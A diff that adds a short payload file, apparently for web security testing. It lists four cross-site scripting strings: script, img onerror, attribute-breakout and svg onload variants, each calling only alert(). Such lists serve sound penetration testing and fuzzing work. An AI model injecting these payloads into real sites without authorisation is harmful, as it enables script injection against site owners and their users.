@@ -1,0 +1,5 @@
+# File: payloads/xss.txt
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS-by-img-tag')>
+"><script>alert('XSS-by-breaking-out')</script>
+<svg onload=alert('XSS-by-svg')>
